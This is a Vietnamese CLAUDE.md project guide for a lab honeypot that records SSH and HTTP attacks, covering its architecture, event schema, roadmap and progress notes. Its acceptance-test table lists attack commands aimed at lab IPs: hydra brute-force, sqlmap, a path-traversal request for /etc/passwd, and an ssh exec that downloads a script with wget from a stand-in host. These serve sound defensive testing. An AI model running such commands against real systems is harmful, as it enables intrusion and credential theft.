# CLAUDE.md — HONEYPY

Honeypot backend viết bằng Python. Mục tiêu: **ghi lại thật sâu một số loại tấn công cụ thể**
(không giả lập mọi thứ một cách nông), chuẩn hoá thành sự kiện có cấu trúc để phân tích.

**Phạm vi hiện tại: chỉ honeypot.** Tích hợp IDS (một thành viên khác làm bằng FastAPI) để sau —
xem mục 7. Đừng thêm code IDS/webhook/outbox khi chưa được yêu cầu.

> Nguyên tắc gốc: không có người dùng hợp lệ nào chạm vào honeypot, nên mọi traffic đến đều đáng ngờ.
> Ghi càng đầy đủ càng tốt; diễn giải sau.

---

## 1. Môi trường: dev trên Windows, chạy trong lab ảo

```
 [Windows host]  viết code, git push
        │ git pull
        ▼
 (A) [VM Ubuntu-TPot 192.168.62.130]  ◄── tấn công ── [Kali 192.168.62.131]
       2222  SSH honeypot (nghe thẳng, KHÔNG NAT)       nmap, hydra, ssh,
       8080  HTTP honeypot (nghe thẳng, KHÔNG NAT)      sqlmap, nikto, gobuster, wpscan
       22/80/443…  honeypot của T-Pot (Cowrie…) — KHÔNG phải của dự án này
       64295 sshd thật để quản trị
       8000  API, chỉ 127.0.0.1

 (B) [VM Ubuntu sạch]  ◄── tấn công ── [Kali]
       22  → NAT → 2222 (SSH honeypot)
       80  → NAT → 8080 (HTTP honeypot)
       22222 sshd thật để quản trị
       8000  API, chỉ 127.0.0.1
```

- Code được **viết trên Windows nhưng chạy trên Ubuntu** → luôn viết đa nền tảng:
  dùng `pathlib` và đường dẫn tính theo vị trí file (`Path(__file__).parent`), không phụ thuộc CWD,
  không hard-code `\`, shebang `python3`, giữ `.gitattributes` với `eol=lf` cho `*.py`, `*.sh`.
- Script vận hành (cài đặt, iptables, systemd) viết bằng bash, đặt trong `scripts/`, chạy trên Ubuntu.
- Hai VM nằm chung mạng **Host-only / NAT Network / Internal** của VirtualBox/VMware.
  Không dùng Bridged và không mở honeypot ra Internet cho tới khi giai đoạn 4 xong.
- Chụp snapshot Ubuntu VM trước mỗi đợt tấn công lớn.

### Cài đặt trên Ubuntu
```bash
git clone git@github.com:ngoccu2006/my_honeypot.git && cd my_honeypot
./scripts/setup_ubuntu.sh        # apt, .venv, requirements-dev.txt, .env, data/, chạy test
```
Host key SSH tự sinh vào `data/server.key` ở lần chạy đầu (mỗi máy một key, không commit).

### Cấu hình
`config.py` (pydantic-settings): biến môi trường `HONEYPY_*` > `.env` > mặc định. Mẫu ở `.env.example`.
Toàn bộ dữ liệu sinh ra khi chạy (DB, log, host key) nằm trong `data/` (gitignore), đường dẫn tính
theo vị trí repo nên chạy từ thư mục nào cũng như nhau. Code mới phải lấy cổng/đường dẫn/banner
từ `settings`, không hard-code.

### Lưu ý: Ubuntu VM là máy chạy T-Pot
- VM Ubuntu-TPot (192.168.62.130) chạy T-Pot: chiếm cổng 22 (Cowrie), 80, 443...; SSH quản trị thật ở 64295.
- Cổng 22/80 trên máy T-Pot là honeypot của T-Pot, không phải của dự án này.
- Trên VM này KHÔNG chạy scripts/iptables.sh và KHÔNG dời sshd. Chạy honeypot ở 2222/8080,
  Kali (192.168.62.131) tấn công thẳng vào các cổng đó. 22/80 chỉ dùng trên VM Ubuntu sạch riêng.

### Đưa honeypot lên cổng thật (22/80) mà không chạy bằng root
1. Dời sshd thật sang 22222: sửa `Port 22222` trong `/etc/ssh/sshd_config`, rồi
   `sudo systemctl daemon-reload && sudo systemctl restart ssh.socket` (Ubuntu 24.04 dùng socket activation).
   Giữ phiên SSH cũ cho tới khi vào được cổng mới.
2. `sudo ./scripts/iptables.sh apply` (NAT 22→2222, 80→8080; từ chối nếu cổng 22 còn dịch vụ khác nghe).
   `remove` / `status` để gỡ / xem. Luật mất khi reboot (cố ý).

PREROUTING không áp dụng cho traffic từ chính máy (localhost) → test trên Ubuntu thì dùng thẳng
2222/8080, còn tấn công từ Kali thì vào cổng 22/80 (chỉ kiểu B; máy T-Pot luôn dùng 2222/8080).

### Chạy & test
```bash
source .venv/bin/activate
python3 honeypy.py --ssh          # mặc định 0.0.0.0:2222, -a/-p/-u/-pw để ghi đè
python3 honeypy.py --http         # mặc định 0.0.0.0:8080
uvicorn api:app --host 127.0.0.1 --port 8000
python3 -m pytest -q              # test dùng data/ tạm (tests/conftest.py), không đụng DB thật
# xem API từ Windows host qua tunnel:  ssh -p 22222 -L 8000:127.0.0.1:8000 user@<ubuntu-ip>
```
Trên Windows: `.venv\Scripts\python -m pytest -q`.
API **không bao giờ** bind `0.0.0.0` — Kali không được thấy nó (attacker không được biết đang bị ghi).

---

## 2. Hiện trạng code (tháng 10/2026)

| File | Vai trò |
|---|---|
| `honeypy.py` | CLI entrypoint, chạy **một** honeypot mỗi tiến trình (`-s` SSH hoặc `-w` HTTP) |
| `config.py` | `Settings` (pydantic-settings), singleton `settings` |
| `ssh_honeypot.py` | SSH bằng paramiko, nhận mọi mật khẩu, shell giả với ~4 lệnh cứng |
| `web_honeypot.py` | Flask, trang login WordPress giả, regex SQLi đơn giản |
| `event_store.py` | SQLite (WAL), 1 bảng `events` phẳng, `log_event()` / `query()` |
| `api.py` | FastAPI đọc DB: `/events`, `/stats/*`, `/stats/bruteforce` |
| `scripts/` | `setup_ubuntu.sh`, `iptables.sh` |
| `tests/` | pytest: store, config, khởi động sensor, API |

### Nợ kỹ thuật đã biết (ưu tiên từ trên xuống)
1. Private key cũ vẫn nằm trong lịch sử git (commit `6d1c849`) → coi như lộ, không dùng lại.
2. Không có khái niệm **session**: không nối được auth → các lệnh → ngắt kết nối của cùng một phiên.
3. Thiếu dữ liệu ngữ cảnh: `src_port`, `dst_port`, SSH client version, HASSH, thời lượng phiên,
   toàn bộ HTTP request (path, method, headers, body, query).
4. SSH `exec` (`ssh host "cmd"` — kiểu bot hay dùng nhất) chỉ ghi file log, **không vào DB**.
5. HTTP chỉ có 2 route; mọi request quét (`/.env`, `/phpmyadmin`, `/wp-login.php`…) trả 404 và không được ghi.
6. Phát hiện tấn công là 1 regex SQLi nằm trong sensor → tách thành tầng detection riêng.
7. Ghi song song file log text + DB (trùng lặp, format không nhất quán) → bỏ file text, dùng JSON log.
8. Tài nguyên không giới hạn: thread/kết nối không cap, `recv(1)` không timeout, lệnh không giới hạn độ dài.
   Hydra từ Kali với `-t 64` sẽ lộ ra vấn đề này đầu tiên.
9. API trả cả mật khẩu, không xác thực (chấp nhận được khi chỉ bind 127.0.0.1).
10. Độ giống thật: paramiko để lộ dấu vết (thuật toán kex, thứ tự cipher) — `nmap -sV`/`ssh-audit`
    từ Kali có thể nhận ra. Shell giả trả `command not found` cho gần như mọi lệnh → attacker bỏ đi ngay.

---

## 3. Phạm vi: những loại tấn công cần ghi SÂU

Ưu tiên chiều sâu trên ít giao thức. Mỗi loại phải có: dữ liệu thô đầy đủ + nhãn phân loại + mapping MITRE ATT&CK.

| Nhóm | Ghi lại những gì | ATT&CK |
|---|---|---|
| **SSH brute-force / credential stuffing** | mọi cặp user/pass, tốc độ thử, client version, HASSH, số user khác nhau/IP | T1110.001, T1110.004 |
| **SSH post-auth** | toàn bộ lệnh theo thứ tự trong session, lệnh `exec`, recon (`uname -a`, `cat /proc/cpuinfo`, `id`) | T1059.004, T1082, T1033 |
| **Tải mã độc / tool** | trích URL từ `wget`/`curl`/`tftp`, chuỗi `curl … \| sh`, payload base64 | T1105 |
| **Persistence** | sửa `~/.ssh/authorized_keys`, `crontab`, `chattr`, `passwd` | T1098.004, T1053.003 |
| **Web scanning / recon** | mọi request: path, method, headers, UA, tần suất; nhận diện scanner (sqlmap, nikto, gobuster, wpscan, nmap NSE) | T1595.002, T1595.003 |
| **Web exploit** | SQLi, XSS, path traversal/LFI, command injection, `${jndi:`, khai thác WordPress/phpMyAdmin | T1190 |
| **Web brute-force** | login form WordPress, `xmlrpc.php` | T1110 |

Ngoài phạm vi trước mắt: Telnet/IoT, SMB, RDP, DB honeypot.

---

## 4. Kiến trúc mục tiêu

```
 Kali ──► [sensors]  ssh / http         (chỉ thu thập, KHÔNG phân loại)
              │  Event (pydantic) chuẩn hoá
              ▼
         [core.store]  SQLite WAL
              │
        ┌─────┴──────┐
        ▼            ▼
    [detect]      [api] FastAPI (127.0.0.1)
    rules → tags   events, sessions, stats, alerts
    + alerts
```

Cấu trúc thư mục hướng tới (refactor dần, không cần làm một lần):
```
honeypy/
  core/      config.py (pydantic-settings, .env), models.py (Event, Session, Alert),
             store.py, logging.py (JSON log)
  sensors/
    ssh/     server.py, shell.py (shell + filesystem giả), commands/
    http/    app.py (route catch-all), personas/ (wordpress, phpmyadmin, .env giả…), templates/
  detect/    http_rules.py, ssh_rules.py, correlation.py (bruteforce, stuffing, scan)
  api/       main.py, routers/
scripts/     setup_ubuntu.sh, iptables.sh, systemd units
tests/
honeypy.py   CLI: chạy nhiều sensor trong một lệnh theo config
```

### Quy tắc thiết kế
- **Sensor chỉ thu thập.** Sensor gọi `emit(event)`; `detect/` gắn tag. Thêm rule không phải sửa sensor,
  và có thể chạy lại rule trên dữ liệu cũ.
- **Mọi thứ đều là Event có schema** (pydantic v2). Không ghi dict tự do.
- **Lưu thô trước, diễn giải sau**: giữ nguyên input (bytes không decode được → base64), cắt ở giới hạn
  cấu hình (vd 64 KB/request) và đánh dấu `truncated`.
- **Lỗi ghi DB không bao giờ được làm sập sensor.**
- **Không bao giờ thực thi input của attacker.** Không `subprocess`, không `eval`, không tải file attacker
  chỉ định — chỉ ghi URL. Lệnh `wget` trong shell giả trả output giả, không gọi mạng.
- Thời gian lưu UTC; API trả ISO 8601 có `Z`.

---

## 5. Schema sự kiện (đề xuất)

```json
{
  "event_id":   "uuid4",
  "ts":         "2026-10-25T07:30:00.123Z",
  "sensor_id":  "hp-ssh-01",
  "protocol":   "ssh",
  "event_type": "ssh.auth.attempt",
  "session_id": "uuid4",
  "src_ip": "192.168.56.102", "src_port": 51234, "dst_port": 22,
  "severity":   "low | medium | high | critical",
  "tags":       ["bruteforce"],
  "attack":     {"category": "credential_access", "technique": "T1110.001", "confidence": 0.9},
  "data":       { "...": "trường riêng theo event_type" }
}
```

`event_type` dạng `protocol.noun.verb`:
- chung: `conn.open`, `conn.close` (kèm `duration`, `bytes_in/out`)
- ssh: `ssh.client_version`, `ssh.kex` (HASSH), `ssh.auth.attempt`, `ssh.auth.success`,
  `ssh.command`, `ssh.exec`, `ssh.download_attempt`
- http: `http.request` (MỌI request), `http.login`
- suy diễn: `alert.bruteforce`, `alert.credential_stuffing`, `alert.scan`, `alert.exploit_attempt`

Bảng DB tối thiểu: `sessions`, `events` (cột chung + `data` JSON), `alerts`.
Đổi schema bằng migration có đánh số, không sửa tay DB.

---

## 6. Lộ trình

**Giai đoạn 0 — Dọn nền** ✅ (25/10/2026)
- Gỡ `server.key`, `__pycache__/` khỏi git; host key tự sinh trong `data/`.
- `requirements.txt` / `requirements-dev.txt`; `.gitattributes` (`eol=lf`); đường dẫn theo vị trí repo.
- `config.py` + `.env.example` (sẽ chuyển vào `core/` khi tái cấu trúc thư mục).
- Sensor không còn side effect lúc import; `scripts/setup_ubuntu.sh`, `scripts/iptables.sh`; pytest.

**Giai đoạn 1 — Session & dữ liệu đầy đủ**
- Bảng `sessions`; mọi event gắn `session_id`, `src_port`, `dst_port`.
- SSH: client version, HASSH, `exec` vào DB, timeout idle, giới hạn kết nối/IP.
- HTTP: route catch-all ghi `http.request` cho mọi path; nhiều persona.
- Bỏ file log text, thay bằng JSON log ra stdout.

**Giai đoạn 2 — Detection**
- `detect/` với rule có test: SQLi, XSS, traversal/LFI, cmd injection, jndi, scanner UA.
- Correlation theo cửa sổ thời gian: bruteforce, credential stuffing, scan nhiều path.
- Trích IOC (URL tải, IP) từ lệnh SSH.

**Giai đoạn 3 — Độ giống thật**
- Shell SSH: filesystem giả (JSON), `uname -a`, `cat /proc/cpuinfo`, `id`, `ps`, `wget`/`curl` output giả.
- Persona web giống WordPress thật (header `X-Powered-By`, `/wp-json/`, `readme.html`) để wpscan/nikto đi sâu.
- Đối chiếu với `nmap -sV`, `ssh-audit`, `wpscan` từ Kali, giảm dấu hiệu nhận diện honeypot.

**Giai đoạn 4 — Vận hành**
- systemd unit cho từng sensor (user riêng, không root), restart tự động.
- API: API key, cursor pagination (`after_id`), `/sessions/{id}` (replay cả phiên).
- Enrichment GeoIP/ASN offline (chỉ có ý nghĩa khi mở ra Internet).

### Kịch bản tấn công từ Kali = bài kiểm thử chấp nhận
Mỗi tính năng coi là xong khi kịch bản tương ứng sinh ra đúng event. Đặt biến trên Kali trước:
```bash
IP=192.168.62.130     # VM T-Pot (kiểu A, mục 1)
SSH_PORT=2222         # máy T-Pot: luôn 2222 — cổng 22 là Cowrie của T-Pot
HTTP_PORT=8080        # máy T-Pot: luôn 8080 — cổng 80 là của T-Pot
```
Lệnh dưới đây viết cho máy T-Pot. Trên VM Ubuntu sạch có NAT (kiểu B) có thể dùng 22/80.

| Từ Kali | Event mong đợi |
|---|---|
| `nmap -sV -p $SSH_PORT,$HTTP_PORT $IP` | `conn.open`/`conn.close`, `http.request` từ NSE, `alert.scan` |
| `hydra -s $SSH_PORT -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$IP` | `ssh.auth.attempt` hàng loạt, `alert.bruteforce` |
| `ssh -p $SSH_PORT root@$IP` rồi gõ lệnh | 1 session chứa `ssh.auth.success` + chuỗi `ssh.command` |
| `ssh -p $SSH_PORT root@$IP 'uname -a; wget http://x/a.sh'` | `ssh.exec`, `ssh.download_attempt` có URL |
| `nikto -h http://$IP:$HTTP_PORT`, `gobuster dir -u http://$IP:$HTTP_PORT -w …` | nhiều `http.request` tag `scanner`, `alert.scan` |
| `sqlmap -u http://$IP:$HTTP_PORT/wp-admin-login --data "username=a&password=b"` | `http.login` tag `sqli`, `alert.exploit_attempt` |
| `curl "http://$IP:$HTTP_PORT/?file=../../etc/passwd"` | `http.request` tag `traversal` |
| `wpscan --url http://$IP:$HTTP_PORT` | `http.request` tag `scanner`, request tới `/wp-json/`, `xmlrpc.php` |

Tiêu chí đạt chung cho **mọi** kịch bản:
- `dst_port` của event là `2222` (SSH) hoặc `8080` (HTTP). Nếu không thấy event nào, rất có thể đã đánh
  nhầm vào Cowrie/T-Pot ở cổng 22/80.
- `src_ip` là IP của Kali (`192.168.62.131`), không phải `127.0.0.1`.

---

## 7. Để sau: tích hợp IDS

Chưa làm. Nhưng giữ thiết kế để sau này ghép dễ:
- `event_id` duy nhất và `id` tự tăng (để làm cursor) trên mọi event.
- Schema mục 5 ổn định; chỉ thêm trường, không đổi tên/xoá trường.
- Không để logic chỉ tồn tại trong log text — mọi thứ phải truy vấn được qua store/API.

---

## 8. Quy ước

- Python ≥ 3.11 (Ubuntu 24.04 có sẵn 3.12), type hints cho code mới, pydantic ở ranh giới module.
- Comment/docstring tiếng Việt như code hiện có; tên biến/hàm tiếng Anh.
- Mỗi rule detection mới kèm test với ít nhất 1 payload dương và 1 payload âm
  (lấy payload thật từ sqlmap/nikto chạy trong lab).
- SQL luôn dùng tham số `?`, không ghép chuỗi từ input.
- Không commit: key, `.env`, `*.db`, log, dữ liệu thu được từ lab.
- Chỉ tấn công các máy trong lab của mình (Ubuntu VM). Không nhắm công cụ từ Kali ra ngoài mạng lab.

---

## 9. Tiến độ & việc tiếp theo

Cập nhật mục này cuối mỗi session: việc đã làm (ngắn gọn) và danh sách việc tiếp theo theo thứ tự.

### Session 25/10/2026 — đã làm
- Đánh giá code ban đầu → nợ kỹ thuật ở mục 2; viết CLAUDE.md; chốt phạm vi chỉ honeypot, IDS để sau.
- Hoàn thành **Giai đoạn 0** (xem mục 6). Chi tiết đáng nhớ:
  - `server.key`, `server.key.pub`, `__pycache__/` đã `git rm --cached`; `Requirements.txt` → `requirements.txt`.
  - `event_store`: đóng connection đúng cách (`closing`), schema tạo ở lần kết nối đầu, DB theo `settings.db_path`.
  - `ssh_honeypot`: `load_host_key()` tự sinh key; `setup_loggers()` gọi trong `honeypot()`;
    `host_key` truyền vào `client_handle()` qua tham số.
  - `web_honeypot`: `setup_logger()` gọi trong `run_web_honeypot()`.
  - 10 test pass trên Windows (Python 3.13, `.venv` trong repo). Đã chạy thử e2e local: SSH login + lệnh,
    HTTP login SQLi đều vào DB, host key tự sinh trong `data/`.
- Cảnh báo `StarletteDeprecationWarning` (httpx) khi chạy test đến từ thư viện — bỏ qua.

### Chưa kiểm chứng
- `scripts/setup_ubuntu.sh` và `scripts/iptables.sh` mới chỉ qua `bash -n`, **chưa chạy trên Ubuntu thật**.
- Chưa có lần tấn công nào từ Kali.

### Việc tiếp theo (theo thứ tự)
1. **Commit + push Giai đoạn 0** (đã stage, chưa commit). Có thể xoá file cũ ở thư mục gốc trên Windows:
   `honeypot.db`, `*.log`, `server.key*` (không còn được dùng).
2. **Dựng lab** trên VM T-Pot (kiểu A): `git clone`/`pull` → `./scripts/setup_ubuntu.sh` → chạy honeypot
   ở 2222/8080. **Không** dời sshd, **không** chạy `iptables.sh` (chỉ dành cho VM Ubuntu sạch, kiểu B).
   Kiểm tra trước `ss -tln | grep -E ':2222|:8080'` để chắc T-Pot không chiếm hai cổng này. Sửa script nếu lỗi.
3. **Baseline từ Kali**: chạy các kịch bản ở mục 6 (nmap, hydra `-t 4`, ssh tương tác, ssh exec, sqlmap, nikto),
   ghi lại cái gì đã/chưa được ghi và `src_ip` có đúng IP Kali không → làm mốc so sánh cho Giai đoạn 1.
4. **Giai đoạn 1**, chia nhỏ, mỗi bước kèm test:
   1. `models.py`: `Event` pydantic theo schema mục 5; migration 001 tạo bảng `sessions` + `events` mới
      (cột chung + `data` JSON). Giữ `log_event()` cũ chạy được cho tới khi các sensor chuyển hết.
   2. SSH session: `session_id` mỗi kết nối, `src_port`/`dst_port`, client version (`transport.remote_version`),
      `conn.open`/`conn.close` kèm `duration`; `ssh.auth.attempt`/`ssh.auth.success`/`ssh.command` gắn session.
   3. `ssh.exec` vào DB (nợ kỹ thuật #4).
   4. Giới hạn tài nguyên: timeout idle cho channel, cap kết nối tổng + mỗi IP, giới hạn độ dài lệnh (#8).
      Kiểm bằng hydra `-t 64` từ Kali.
   5. HTTP route catch-all → `http.request` cho mọi path (method, path, query, headers, body cắt + `truncated`) (#5).
   6. Bỏ file log text, thay bằng JSON log ra stdout (#7).
   7. HASSH: paramiko không lộ KEXINIT của client ra API công khai → cần nghiên cứu hook riêng; làm cuối.
   8. Cập nhật `api.py` đọc schema mới (`/sessions`, `/sessions/{id}`).
